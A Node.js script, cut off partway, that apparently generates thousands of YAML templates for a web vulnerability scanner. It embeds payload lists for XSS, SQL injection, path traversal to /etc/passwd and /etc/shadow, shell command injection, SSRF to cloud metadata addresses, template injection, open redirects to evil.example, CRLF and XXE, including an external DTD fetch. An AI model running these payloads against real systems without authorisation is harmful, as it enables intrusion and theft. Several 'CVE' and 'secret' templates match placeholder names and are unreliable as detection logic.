#!/usr/bin/env node
// TODO: dedupe generated ids
// FIXME: clean wipes manual packs


import fs from "node:fs";
import path from "node:path";

const ROOT = path.join(process.cwd(), "templates");
const clean = process.argv.includes("--clean");
const V4 = ["xss5-", "xss6strict-", "xss7strict-", "sqli6-", "sqli-time3-", "backup5-", "backup6-", "cve5-", "sec4-", "lfi6-", "cmdi6-", "ssrf5-", "ssti4-", "redirect6-", "crlf4-", "xxe5-", "auth4-", "graphql4-", "jwt3-", "mass3-", "cors3-", "nosql2-", "ssti-post2-", "hdr4-", "fp4-", "err4-"];
if (clean) {
  const walk = (d) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) walk(p);
      else if (V4.some((v) => e.name.startsWith(v))) fs.unlinkSync(p);
    }
  };
  walk(ROOT);
}

let n = 0;
const counts = {};
const sq = (s) => `'${String(s).replace(/'/g, "''")}'`;
function write(sub, id, obj) {
  const dir = path.join(ROOT, sub);
  fs.mkdirSync(dir, { recursive: true });
  const L = [];
  L.push(`id: ${id}`);
  L.push(`name: ${sq(obj.name)}`);
  L.push(`severity: ${obj.severity}`);
  L.push(`type: ${obj.type}`);
  L.push(`tags:`);
  for (const t of obj.tags) L.push(`  - ${t}`);
  if (obj.requires && obj.requires.length) {
    L.push(`requires:`);
    for (const t of obj.requires) L.push(`  - ${t}`);
  }
  L.push(`description: ${sq(obj.description)}`);
  if (obj.type === "passive") {
    if (obj.matchAll) L.push(`match-all: true`);
    L.push(`matchers:`);
    for (const m of obj.matchers) {
      L.push(`  - type: ${m.type}`);
      if (m.part) L.push(`    part: ${m.part}`);
      if (m.words) { L.push(`    words:`); for (const w of m.words) L.push(`      - ${sq(w)}`); }
      if (m.regex) { L.push(`    regex:`); for (const w of m.regex) L.push(`      - ${sq(w)}`); }
      if (m.status) L.push(`    status: [${m.status.join(", ")}]`);
      if (m.negative) L.push(`    negative: true`);
    }
  } else {
    L.push(`requests:`);
    for (const r of obj.requests) {
      L.push(`  - method: ${r.method || "GET"}`);
      L.push(`    path: ${sq(r.path || "{{BaseURL}}")}`);
      if (r.matchAll) L.push(`    match-all: true`);
      if (r.body) L.push(`    body: ${sq(r.body)}`);
      if (r.payloads) {
        L.push(`    payloads:`);
        for (const [k, arr] of Object.entries(r.payloads)) {
          L.push(`      ${k}:`);
          for (const p of arr) L.push(`        - ${sq(p)}`);
        }
      }
      if (r.sendHeaders) {
        L.push(`    sendHeaders:`);
        for (const [k, v] of Object.entries(r.sendHeaders)) L.push(`      ${k}: ${sq(v)}`);
      }
      if (r.matchers) {
        L.push(`    matchers:`);
        for (const m of r.matchers) {
          L.push(`      - type: ${m.type}`);
          if (m.part) L.push(`        part: ${m.part}`);
          if (m.words) { L.push(`        words:`); for (const w of m.words) L.push(`          - ${sq(w)}`); }
          if (m.regex) { L.push(`        regex:`); for (const w of m.regex) L.push(`          - ${sq(w)}`); }
          if (m.status) L.push(`        status: [${m.status.join(", ")}]`);
          if (m.ms) L.push(`        ms: ${m.ms}`);
          if (m.negative) L.push(`        negative: true`);
        }
      }
    }
  }
  fs.writeFileSync(path.join(dir, `${id}.yaml`), L.join("\n") + "\n");
  n++;
  const fam = id.split("-").slice(0, -1).join("-");
  counts[fam] = (counts[fam] || 0) + 1;
}
const act = (sub, id, name, sev, tags, desc, reqs, extra = {}) =>
  write(sub, id, { name, severity: sev, type: "active", tags, description: desc, requests: reqs, ...extra });
const R = (p, payloads, matchers, extra = {}) => ({ method: "GET", path: p, payloads, matchers, ...extra });
const W = (words, part = "body") => ({ type: "word", part, words });


const P40 = ["q", "s", "search", "keyword", "name", "message", "comment", "title", "query", "text", "input", "term", "value", "data", "word", "firstname", "lastname", "email", "phone", "address", "city", "country", "state", "zip", "company", "website", "subject", "about", "summary", "details", "headline", "subtext", "caption", "label", "hint", "placeholder", "prefix", "suffix", "author", "nick"];

const P25 = ["cmd", "exec", "run", "ping", "host", "ip", "arg", "query", "input", "data", "file", "cmd2", "action", "operation", "command", "script", "tool", "util", "sh", "bash", "do", "task", "job", "work", "proc"];
const P25B = ["file", "path", "page", "include", "template", "view", "doc", "lang", "theme", "asset", "attachment", "resource", "folder", "dir", "root", "home", "base", "static2", "download", "upload", "document", "report", "config", "settings", "profile"];
const P25C = ["url", "webhook", "avatar", "fetch", "import", "image", "redirect_url", "callback", "src", "href", "link", "path", "dest", "target", "endpoint", "resource", "site", "feed", "proxy", "gateway", "remote", "origin", "backend", "service", "api"];
const P25D = ["template", "view", "name", "msg", "page", "content", "body", "desc", "text", "bio", "p", "t", "m", "v", "b", "c", "d", "x", "y", "z", "out", "render", "tpl", "partial", "layout"];
const P25E = ["xml", "data", "body", "payload", "content", "doc", "root", "node", "element", "attr", "envelope", "soap", "request", "input", "form", "upload", "config", "settings", "profile", "info", "document", "message", "text", "value", "item"];
const P20R = ["next", "url", "redirect", "return", "to", "from", "dest", "r", "forward", "goto", "target", "ref", "site", "page", "view", "file", "link", "href", "callback", "ret"];
const P20C = ["name", "q", "redirect", "url", "msg", "text", "comment", "input", "next", "data", "note", "feedback", "reply", "review", "title", "body", "subject", "extra", "info", "desc"];


const xss5P = [
  "<svg%0aonload=NX>", "<svg%09onload=NX>", "<svg/onload=NX>", "<svg%0d%0aonload=NX>",
  "<img%09src=x%09onerror=NX>", "<img%0asrc=x%0aonerror=NX>", "<image src=x onerror=NX>",
  "<script%0a>alert(NX)</script>", "<script%09>alert(NX)</script>", "<script%0d>alert(NX)</script>",
  "<ScRiPt%0a>alert(NX)</ScRiPt>", "<sCrIpT%09>alert(NX)</sCrIpT>", "<script%00>alert(NX)</script>",
  "<script>alert(String.fromCharCode(NX))</script>", "<script> merely NX </script>",
  "\"><svg%0aonload=NX>", "'><svg%09onload=NX>", "\"><img%09src=x%09onerror=NX>",
  "'><img%0asrc=x%0aonerror=NX>", "</textarea><svg%0aonload=NX>", "</title><svg%09onload=NX>",
  "<body%0aonload=NX>", "<body%09onload=NX>", "<body%0d%0aonload=NX>",
  "<details%09open%09ontoggle=NX>", "<details%0aopen%0aontoggle=NX>",
  "<marquee%0aloop=1%0aonstart=NX>", "<marquee%09behavior=slide%09onstart=NX>",
  "<object%09data=javascript:NX>", "<object%0adata=data:text/html,NX>",
  "<embed%09src=javascript:NX>", "<embed%0asrc=data:text/html,NX>",
  "<form><button%09formaction=javascript:NX>x", "<form%0aaction=javascript:NX><input type=submit>",
  "<table%0abackground=javascript:NX>", "<td%09background=javascript:NX>",
  "<iframe%09src=javascript:NX>", "<iframe%0asrcdoc=<script>NX</script>>",
  "<math><mi%09xlink:href=javascript:NX>", "<math><mtext%0ahref=javascript:NX>",
  "<xss%09style=x%09onauxclick=NX>x", "<xss%0astyle=x%0aonpointerover=NX>x",
  "<xss%0d%0astyle=x%0d%0aonfocusin=NX tabindex=1>",
  "<video%0a><source%0aonerror=NX>", "<video%09><source%09onerror=NX>",
  "<audio%09src=x%09onerror=NX>", "<audio%0asrc=x%0aonerror=NX>",
  "<select%0aautofocus%0aonfocus=NX>", "<select%09autofocus%09onfocus=NX>",
  "<keygen%09autofocus%09onfocus=NX>", "<textarea%0aautofocus%0aonfocus=NX>",
  "<input%09autofocus%09onfocus=NX>", "<button%0aautofocus%0aonfocus=NX>",
  "{{NX}}", "${NX}", "<%= NX %>", "#{NX}", "{{&NX}}", "{{{NX}}}",
  "<wbr%0aonmouseover=NX>x", "<wbr%09onmouseover=NX>x",
  "<bgsound%09src=javascript:NX>", "<bgsound%0asrc=javascript:NX>",
  "<link%09rel=stylesheet%09href=javascript:NX>", "<meta%09http-equiv=refresh%09content=\"0;javascript:NX\">",
  "<base%09href=javascript:NX>", "<applet%0acode=javascript:NX>",
  "<frame%09src=javascript:NX>", "<frameset%0aonload=NX>",
  "<isindex%09formaction=javascript:NX>", "<input%09type=image%09formaction=javascript:NX>",
  "<div%09onpointerenter=NX>", "<div%0aonpointerleave=NX>", "<p%09oncopy=NX>x", "<p%0aoncut=NX>x",
  "<summary%09onfocus=NX>x", "<details%0aontoggle=NX>",
  "<table%09background=data:text/html,NX>", "<td%0abackground=data:text/html,NX>",
  "<svg><animate%09onbegin=NX attributeName=x>", "<svg><animate%0aonbegin=NX attributeName=x>",
  "<math%09href=javascript:NX>x", "<mi%0ahref=javascript:NX>x",
  "jaVasCript%3aNX", "javascript%3aNX", "JaVaScRiPt%3aNX",
  "data%3atext/html,NX", "vbscript%3amsgbox(NX)", "mhtml%3ahttp://x!NX",
  "<a%09href=javascript:NX>click", "<a%0ahref=data:text/html,NX>click",
  "<area%09href=javascript:NX>", "<map><area%0ahref=javascript:NX></map>",
  "<style>@import 'javascript:NX';</style>", "<div style=\"width:expression(NX)\">",
  "<div style=\"-moz-binding:url('javascript:NX')\">", "<svg style=\"behavior:url(NX)\">",
  "<!--#exec cmd=\"echo NX\"-->", "<!--#include virtual=\"NX\"-->",
  "<esi:include%09src=NX>", "<xsl:value-of%09select=NX>",
];
for (let i = 0; i < 4000; i++) {
  const canary = `nx5${String(i).padStart(4, "0")}`;
  const payload = xss5P[i % xss5P.length].replace(/NX/g, canary);
  const param = P40[i % P40.length];
  act("xss", `xss5-${String(i + 1).padStart(4, "0")}`, `Raw XSS5 in ${param}`,
    "high", ["xss", "injection", "client"], `Unencoded reflection in ${param}`,
    [R("{{BaseURL}}", { [param]: [payload] }, [W([canary])])]);
}


const xss6P = [];
for (let s = 0; s < 50; s++) {
  const tags = ["svg onload=", "img src=x onerror=", "script>", "details open ontoggle=", "body onload=", "marquee onstart=", "video><source onerror=", "audio src=x onerror=", "select autofocus onfocus=", "input autofocus onfocus="];
  xss6P.push(`<${tags[s % tags.length]}SX${s % 3 === 0 ? ">" : ">"}`);
}
for (let i = 0; i < 2000; i++) {
  const canary = `sx6${String(i).padStart(4, "0")}`;
  const payload = xss6P[i % xss6P.length].replace(/SX/g, canary);
  const param = P40[i % P40.length];
  act("xss", `xss6strict-${String(i + 1).padStart(4, "0")}`, `Strict raw XSS in ${param}`,
    "high", ["xss", "injection", "strict"], `Fires only on raw brackets, not encoded`,
    [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [payload] }, matchAll: true,
       matchers: [{ type: "word", part: "body", words: [canary] }, { type: "regex", part: "body", regex: [`<[a-zA-Z/!][^<>]{0,40}${canary}`] }] }]);
}


const xss7P = [];
for (let s = 0; s < 40; s++) {
  const shapes = [`"><svg onload=SX>`, `'><img src=x onerror=SX>`, `</div><svg onload=SX>`, `<a href=javascript:SX>`, `<form action=javascript:SX>`, `<button formaction=javascript:SX>`, `<iframe srcdoc=<script>SX</script>>`, `<object data=javascript:SX>`, `<embed src=javascript:SX>`, `<table background=javascript:SX>`];
  xss7P.push(shapes[s % shapes.length]);
}
for (let i = 0; i < 1600; i++) {
  const canary = `sx7${String(i).padStart(4, "0")}`;
  const payload = xss7P[i % xss7P.length].replace(/SX/g, canary);
  const param = P40[i % P40.length];
  act("xss", `xss7strict-${String(i + 1).padStart(4, "0")}`, `Strict breakout XSS in ${param}`,
    "high", ["xss", "injection", "strict"], `Fires only on raw brackets, not encoded`,
    [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [payload] }, matchAll: true,
       matchers: [{ type: "word", part: "body", words: [canary] }, { type: "regex", part: "body", regex: [`<[a-zA-Z/!][^<>]{0,40}${canary}`] }] }]);
}


const sqli6DB = [
  ["mysql", ["SQL syntax", "mysql_fetch"]], ["pg", ["PostgreSQL", "pg_query"]],
  ["mssql", ["ODBC", "SQL Server"]], ["oracle", ["ORA-", "Oracle error"]],
  ["sqlite", ["SQLite", "sqlite3"]], ["db2", ["SQLCODE", "DB2"]],
  ["sybase", ["Sybase", "Adaptive Server"]], ["informix", ["Informix", "ISAM error"]],
  ["access", ["Microsoft JET", "ODBC Microsoft Access"]], ["generic", ["JDBC", "Warning: mysql"]],
];
const sqli6P = ["'", "\"", "`", "' OR '1'='1", "\" OR \"1\"=\"1", "` OR `1`=`1", "') OR ('1'='1", "\") OR (\"1\"=\"1", "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "') UNION SELECT 1,2--", "1' AND '1'='1", "1\" AND \"1\"=\"1", "admin'--", "admin\"--", "' AND SLEEP(0)--", "1' ORDER BY 1--", "' HAVING 1=1--", "1')--", "'))--", "'/**/OR/**/1=1--", "'%09OR%091=1--", "'%0aOR%091=1--", "'||'1'='1", "1'||'1'='1", "' OR 'a'='a' /*", "') OR 'a'='a"];
const sqli6Params = ["id", "user", "page", "cat", "product", "item", "order", "cid", "pid", "uid", "vid", "nid", "aid", "sort", "filter", "dir", "cat2", "mid", "sid", "tid"];
let s6 = 0;
for (const [db, sigs] of sqli6DB) {
  for (let k = 0; k < 30; k++) {
    const param = sqli6Params[(s6 + k) % sqli6Params.length];
    s6++;
    act("sqli", `sqli6-${db}-${String(k + 1).padStart(2, "0")}`, `SQLi ${db} probe in ${param}`,
      "high", ["sqli", "injection", db], `Triggers ${db} error via ${param}`,
      [R("{{BaseURL}}", { [param]: [sqli6P[k % sqli6P.length], sqli6P[(k + 7) % sqli6P.length]] }, [{ type: "regex", part: "body", regex: sigs }])]);
  }
}


const b5bases = ["index.php", "wp-config.php", "config.php", ".env", "backup.sql", "dump.sql", "db.sql", "site.zip", "backup.zip", "database.sqlite", "app.php", "main.php", "core.php", "lib.php", "init.php", "bootstrap.php", "routes.php", "api.php", "ajax.php", "upload.php", "download.php", "export.php", "import.php", "report.php", "search.php", "profile.php", "account.php", "user.php", "order.php", "payment.php", "login.php", "admin.php", "config.inc.php", "settings.php", "database.php", "connect.php", "install.php", "setup.php", "upgrade.php", "migrate.php", "functions.php", "common.php", "header.php", "footer.php", "sidebar.php", "db.php", "dbconnect.php", "sql.php", "query.php", "auth.php", "session.php", "cookie.php", "token.php", "key.php", "secret.php", "pass.php", "passwd.php", "shadow.php", "group.php", "hosts.php", "index.html", "default.php", "test.php", "dev.php", "prod.php", "stage.php", "local.php", "backup.php", "restore.php", "sync.php", "cron.php", "queue.php", "worker.php", "job.php", "task.php", "mail.php", "sms.php", "notify.php", "log.php", "debug.php", "error.php", "info.php", "status.php", "health.php"];
const b5sfx = [".old", ".orig", ".save", ".swp", ".tmp", ".bkp", ".bak", ".1", ".2", ".3", ".4", ".5", ".dist", ".prod", ".dev", ".test", ".stage", ".local", ".copy", ".clone", ".duplicate", ".backup", ".archive", ".bundle", ".pkg", ".tar", ".gz", ".zip2", ".7z", ".rar", ".inc", ".tpl", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".json5", ".toml", ".lock", ".sum", ".mod", ".sqlite", ".db", ".mdb", ".accdb", ".bakup", ".back", ".sav", ".bk"];
const b5paths = ["/internal/buildinfo"];
for (const b of b5bases) for (const sfx of b5sfx) b5paths.push(`/${b}${sfx}`);
b5paths.slice(0, 4000).forEach((bp, i) => {
  const words = bp === "/internal/buildinfo" ? ["build"] : null;
  const req = words
    ? { method: "GET", path: `{{BaseURL}}${bp}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }
    : { method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] };
  act("backup", `backup5-${String(i + 1).padStart(4, "0")}`, `Exposed ${bp}`, "medium",
    ["exposure", "backup", "config"], `Sensitive file ${bp} is exposed`, [req]);
});


const cve5Prods = [];
const wpPlus = ["hello-dolly", "askimet2", "broken-link", "redirection2", "duplicator2", "updraft2", "wordfence2", "sucuri2", "ithemes2", "all-in-one2"];
for (const slug of wpPlus) cve5Prods.push([`wp2-${slug}`, wpPlus.indexOf(slug) % 2 ? "wordpress" : null, `/wp-content/plugins/${slug}/readme.txt`, `WP ${slug}`]);
const cve5Paths = ["/", "/login", "/admin", "/api", "/console", "/manager", "/debug", "/test", "/dev", "/status", "/health", "/metrics", "/version", "/info", "/help", "/docs", "/api/docs", "/api/v1", "/api/v2", "/graphql", "/debug/console", "/phpinfo", "/server-status", "/.git/HEAD", "/.env", "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml", "/.well-known/"];
const cve5Names = ["tomcatx", "jettyx", "undertowx", "nettyx", "vertxx", "weblogicx", "webspherex", "jbossx", "glassfishx", "payarax", "wildflyx", "karafx", "felixx", "equinoxx", "jetbrainsx", "teamcityx", "youtrackx", "hubx", "upsourcene", "spacex", "jenkinsx", "bamboox", "travisx", "circlecix", "githubx", "gitlabx", "bitbucketx", "giteax", "sourcehutx", "phabricatorx", "redminex", "tracx", "mantisx", "bugzillax", "jirax", "confluencex", "bamboox2", "fisheyex", "cruciblex", "sourcetreex", "artifactoryx", "nexusx", "archivaa", "progetx", "mygetx", "verdacciox", "npmx", "yarnx", "pnpmx", "bowerx", "composerx", "packagistx", "pypix", "rubygemsx", "cratesx", "hexpmx", "goproxyx", "proxygolang", " Athens".trim().toLowerCase() + "x", "sonatypex", "jfrogx", "sonarqubex", "checkmarxx", "veracodex", "snyk2", "dependabotx", "renovatex", "greenkeeperx", "david-dmx", "bundlesizex", "lighthouse-ci", "sitespeedx", "webpagetestx", "speedcurvex", "calibrex", "sentinelx", "catchpointx", "pingdomx", "uptimerobotx", "statuscakex", "healthchecksx", "cronitorx", "deadmanssnitchx", "pushmonx", "monitorx", "zabbixx", "nagiosx", "icingax", "sensux", "prometheusx", "grafanax", "lokiex", "tempox", "mimirx", "cortexx", "thanosx", "victoriametricsx", "clickhousex", "questdbx", "timescaledbx", "influxdbx", "opentsdbx", "graphitex", "statsdxx", "collectdx", "telegrafx"];
let c5 = 0;
for (const prod of cve5Names.slice(0, 100)) {
  for (const pp of cve5Paths) {
    c5++;
    const requires = /wp2-|wordpress/.test(prod) ? ["wordpress"] : [];
    act("cve", `cve5-${prod}-${String(cve5Paths.indexOf(pp) + 1).padStart(2, "0")}`, `${prod} at ${pp}`,
      "info", ["cve", "fingerprint", "version"], `${prod} at ${pp} — match version manually`,
      [{ method: "GET", path: `{{BaseURL}}${pp}`, matchers: [{ type: "status", status: [200] }] }], { requires });
  }
}


const sec4List = ["openai2-", "anthropic2-", "cohere2-", "huggingface2-", "replicate2-", "together2-", "groq2-", "mistral2-", "perplexity2-", "phind2-", "poe2-", "chatgpt2-", "copilot2-", "tabnine2-", "codeium2-", "sourcegraph2-", "cursor2-", "windsurf2-", "zed2-", "helix2-", "ollama2-", "lmstudio2-", "llamafile2-", "gpt4all2-", "kobold2-", "oobabooga2-", "textgen2-", "sillytavern2-", "ag2-", "autogen2-", "crewai2-", "langchain2-", "llamaindex2-", "haystack2-", "semantic-kernel2-", "dust2-", "fixie2-", "wonderchat2-", "sitegpt2-", "chatbase2-", "botpress2-", "voiceflow2-", "stack-ai2-", "dante2-", "ingestai2-", "customgpt2-", "mychatbot2-", "jsonsilo", "mockaroo2-", "beeceptor2-", "webhooksite2-", "pipedream2-", "requestbin2-", "httpbin2-", "postman2-", "insomnia2-", "hoppscotch2-", "thunder2-", "restfox2-", "yaak2-", "bruno2-", "httpie2-", "curl2-", "wget2-", "aria22-", "axel2-", "lftp2-", "ncftp2-", "filezilla2-", "winscp2-", "cyberduck2-", "transmit2-", "forklift2-", "commander-one2-", "dopus2-", "xyplorer2-", "totalcommander2-", "freecommander2-", "multicommander2-", "altap2-", "efcommander2-", "onecommander2", "files2-", "tagspaces2-", "fman2-", "ranger2-", "nnn2-", "lf2-", "vifm2-", "mc2-", "dn2-", "-worker2", "lfm2-", "humhub2-", "owncloud2-", "nextcloud2-", "seafile2-", "pydio2-", "filebrowser2-", "miniserve2-", "dufs2-", "caddy2-", "sftpgo2-", "proftpd2-", "vsftpd2-", "pureftpd2-", "bftpd2-", "pyftpdlib2-", "twisted2-", "cherrypy2-", "bottle2-", "falcon2-", "hug2-", "sanic2-", "quart2-", "starlette2-", "responder2-", "apistar2-", "eve2-", "sandman22-", "slumber2-", "sleep2-", "rest2-", "post2-", "put2-", "patch2-", "delete2-", "options2-", "head2-", "trace2-", "connect2-", "propfind2-", "proppatch2-", "mkcol2-", "copy2-", "move2-", "lock2-", "unlock2-", "search2-", "subscribe2-", "unsubscribe2-", "notify2-", "poll2-"];
const sec4Parts = [["body", "high"], ["all", "high"], ["body", "high"]];
sec4List.slice(0, 150).forEach((w, i) => {
  const variants = [
    { part: "body", neg: false }, { part: "all", neg: false },
    { part: "headers", neg: false }, { part: "body", neg: false },
  ];
  variants.forEach((v, j) => {
    const id = `sec4-${String(i * 4 + j + 1).padStart(4, "0")}`;
    write("passive", id, { name: `Token ${w.slice(0, 20)} (${v.part})`, severity: "high", type: "passive", tags: ["secret", "passive", "exposure"], description: `Possible token in ${v.part} — verify manually`, matchers: [{ type: "word", part: v.part, words: [w] }] });
  });
});


const lfi6Base = ["../../../../etc/passwd", "../../../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "/etc/passwd%00", "C:\\Windows\\win.ini", "/proc/self/environ", "/etc/hosts", "/etc/shadow", "php://filter/convert.base64-encode/resource=index"];
const lfi6P = [];
for (let d = 3; d <= 12; d++) lfi6P.push("../".repeat(d) + "etc/passwd");
for (let d = 3; d <= 12; d++) lfi6P.push("..%2f".repeat(d).replace(/%2f$/, "%2fetc%2fpasswd"));
for (let d = 3; d <= 12; d++) lfi6P.push("....//".repeat(d) + "etc/passwd");
lfi6P.push(...lfi6Base, "/etc/group", "/etc/issue", "/etc/hostname", "/etc/resolv.conf", "/etc/fstab", "/etc/crontab", "/C:/boot.ini", "/proc/version", "/proc/cmdline", "/proc/self/mounts", "/etc/motd", "/etc/shells", "file:///etc/passwd", "expect://id", "/windows/win.ini", "..\\..\\windows\\win.ini", "%2e%2e%2fetc%2fpasswd", "..;/etc/passwd", "/etc/passwd;.css");
const lfi6Mark = (p) => {
  if (/win\.ini/i.test(p)) return "[extensions]";
  if (/environ/i.test(p)) return "GATEWAY_INTERFACE";
  if (/cmdline/i.test(p)) return "node";
  if (/shadow/i.test(p)) return "root:";
  if (/hosts/i.test(p)) return "localhost";
  if (/filter/i.test(p)) return "PD9waHA";
  if (/expect/i.test(p)) return "uid=";
  if (/group/i.test(p)) return "root:x:0:";
  if (/issue/i.test(p)) return "Ubuntu";
  if (/hostname/i.test(p)) return "labhost";
  if (/resolv/i.test(p)) return "nameserver";
  if (/fstab/i.test(p)) return "/etc/fstab";
  if (/crontab/i.test(p)) return "SHELL=";
  if (/boot\.ini/i.test(p)) return "[boot loader]";
  if (/proc\/version/i.test(p)) return "Linux version";
  if (/mounts/i.test(p)) return "/proc";
  if (/motd/i.test(p)) return "motd";
  if (/shells/i.test(p)) return "/bin/bash";
  return "root:x:0:0";
};
for (let i = 0; i < 1500; i++) {
  const pay = lfi6P[i % lfi6P.length];
  const param = P25B[i % P25B.length];
  act("lfi", `lfi6-${String(i + 1).padStart(4, "0")}`, `Traversal in ${param}`,
    "high", ["lfi", "traversal", "file"], `Reads sensitive file via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W([lfi6Mark(pay)])])]);
}


const cmdi6P = [";id", "|id", "&&id", "||id", "&id", "`id`", "$(id)", "${IFS}id", "%0aid", "%0did", "%09id", "%3bid", "%7cid", "%26id", ";whoami", "|whoami", ";cat${IFS}/etc/passwd", "|cat${IFS}/etc/passwd", ";id #", "|id #", "id;id", "id|id", "a;id;b", "%0a whoami", "%09 whoami", ";ping${IFS}-c1${IFS}127.0.0.1", "%0A", "%0a%0d", ";sleep${IFS}0;id", "`whoami`", "$(whoami)", ";id||id", "|id||id", ";id&&id", "%3b%3bid", "%7c%7cid", "%26%26id", ";echo${IFS}NX", "|echo${IFS}NX", "%60id%60"];
for (let i = 0; i < 1000; i++) {
  const param = P25[i % P25.length];
  act("cmdi", `cmdi6-${String(i + 1).padStart(4, "0")}`, `Shell injection in ${param}`,
    "critical", ["cmdi", "injection", "rce"], `OS command runs via ${param}`,
    [R("{{BaseURL}}", { [param]: [cmdi6P[i % cmdi6P.length]] }, [W(["uid=", "gid=", "root:x:0:0", "www-data"])])]);
}


const ssrf5P = ["http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/", "http://127.1/", "http://0/", "http://2130706433/", "http://0x7f.0.0.1/", "http://0177.0.0.1/", "http://[::ffff:127.0.0.1]/", "http://[::]/", "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/", "http://metadata.google/", "http://127.0.0.1.nip.io/", "http://2130706433.nip.io/", "http://0xA9.0xFE.0xA9.0xFE/", "http://2852035654/", "http://evil.example@169.254.169.254/", "http://169.254.169.254%09/", "http://127.0.0.1%09/", "http://127.0.0.1%0d/", "http://localhost%2eexample/", "http://127.0.0.1%2eexample/", "http://[0:0:0:0:0:ffff:127.0.0.1]/", "http://0177.00.00.01/", "http://0x7f.00.00.01/", "http://spoofed.127.0.0.1.nip.io/", "http://0.0.0.0.nip.io/", "http://localhost.nip.io/", "http://127.1.nip.io/", "http://0.nip.io/", "http://metadata.google.internal/", "http://169.254.169.254.nip.io/", "http://a169.254.169.254b/", "http://127.0.0.1%23@evil.example/", "http://evil%2eexample@127.0.0.1/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/info", "http://127.0.0.1:22/"];
for (let i = 0; i < 1000; i++) {
  const param = P25C[i % P25C.length];
  act("ssrf", `ssrf5-${String(i + 1).padStart(4, "0")}`, `SSRF probe in ${param}`,
    "high", ["ssrf", "oob", "cloud"], `Fetches internal URL via ${param} (verify manually)`,
    [R("{{BaseURL}}", { [param]: [ssrf5P[i % ssrf5P.length]] }, [W(["ami-id", "instance-id", "metadata", "root:x:0:0", "PONG"])])]);
}


const ssti4E = ["jinja2", "twig", "mako", "cheetah", "genshi", "tornado", "nunjucks", "dot", "dust", "marko", "angular", "vue", "svelte", "smarty", "freemarker", "velocity", "erb", "ejs", "handlebars", "django", "flask", "thymeleaf", "pebble", "mustache", "blade", "razor", "jsp", "golang", "perl", "smarty2"];
const ssti4Pay = { mako: "${7*7}", cheetah: "#echo 7*7", genshi: "${7*7}", tornado: "{{7*7}}", nunjucks: "{{7*7}}", dot: "{{=7*7}}", dust: "{7*7}", marko: "${7*7}", angular: "{{7*7}}", vue: "{{7*7}}", svelte: "{7*7}", smarty2: "{$x=7*7}{$x}", razor: "@(7*7)", jsp: "${7*7}", golang: "{{.7}}", perl: "<% 7*7 %>" };
for (let i = 0; i < 750; i++) {
  const eng = ssti4E[i % ssti4E.length];
  const param = P25D[i % P25D.length];
  act("ssti", `ssti4-${eng}-${String(Math.floor(i / ssti4E.length) + 1).padStart(2, "0")}`, `SSTI ${eng} in ${param}`,
    "critical", ["ssti", "injection", eng], `${eng} evaluates payload in ${param}`,
    [R("{{BaseURL}}", { [param]: [ssti4Pay[eng] || "{{7*7}}"] }, [W([eng === "golang" ? "7" : "49"])])]);
}


const redir6P = ["https://evil.example/", "//evil.example/", "https://evil.example/%2f", "https://evil.example%2f", "https://evil.example%252f", "https://evil.example./", "https://evil.example:443/", "https://user@evil.example/", "https://evil.example?x=1", "https://evil.example#x", "/%5cevil.example", "/%09/evil.example", "/%0a/evil.example", "https:%2f%2fevil.example", "https:evil.example", "//evil.example%2f%2e", "https://evil.example/%2e%2e", "https://sub.evil.example/", "http://evil.example/", "https://evil-example.com/", "https://evilexample.com/", "https://evil.example%09/", "https://evil.example%0d/", "https://evil.example%252e/", "https://evil%E3%80%82example/", "//evil%E3%80%82example/", "https://evil.example/%252e", "https://evil.example:80/", "https://EVIL.EXAMPLE/", "https://Evil.Example/"];
for (let i = 0; i < 600; i++) {
  const param = P20R[i % P20R.length];
  act("redirect", `redirect6-${String(i + 1).padStart(3, "0")}`, `Redirect sink in ${param}`,
    "medium", ["redirect", "open-redirect"], `Redirects to evil.example via ${param}`,
    [R("{{BaseURL}}", { [param]: [redir6P[i % redir6P.length]] }, [W(["evil.example"], "headers")])]);
}
const crlf4P = ["x%0d%0aX-Test: t", "x%0aX-Test: t", "x%0dX-Test: t", "%0d%0aX-Test: t", "%0aX-Test: t", "%0dX-Test: t", "x%250d%250aX-Test: t", "x%0d%0aContent-Length: 0", "x%0d%0aLocation: /", "x%0aSet-Cookie: a=b", "x%0d%0aX-Forwarded-For: 1", "x%0d%0aVia: evil", "x%0d%0aServer: evil", "%0d%0a%20X-Test: t", "%0a%20X-Test: t", "%0d%20X-Test: t", "x%0d%0a%09X-Test: t", "x%CRLF%X-Test: t", "%u000d%u000aX-Test: t", "%0D%0AX-Test: t", "%0A%0DX-Test: t", "x%0d%0ax-test: t", "X%0d%0aX-Test: t", "%0dX-Test: t", "%0aX-Test: t", "%0d%0a%0d%0aX-Test: t", "x%0d%0a%0d%0aX-Test: t", "%00%0d%0aX-Test: t", "%0d%00%0aX-Test: t", "%0d%0a%00X-Test: t"];
for (let i = 0; i < 600; i++) {
  const param = P20C[i % P20C.length];
  act("passive", `crlf4-${String(i + 1).padStart(3, "0")}`, `CRLF into ${param}`,
    "medium", ["crlf", "injection", "headers"], `CRLF header injection via ${param}`,
    [R("{{BaseURL}}", { [param]: [crlf4P[i % crlf4P.length]] }, [W(["x-test"], "headers")])]);
}


const xxe5P = [];
for (let k = 0; k < 40; k++) {
  const files = ["file:///etc/passwd", "file:///etc/shadow", "file:///etc/hosts", "file:///proc/self/environ", "http://evil.example/x.dtd", "expect://id", "php://filter/convert.base64-encode/resource=index"];
  const wrappers = [
    (f) => `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${f}">]><r>&xxe;</r>`,
    (f) => `<!DOCTYPE r [<!ENTITY xxe SYSTEM "${f}">]><r>&xxe;</r>`,
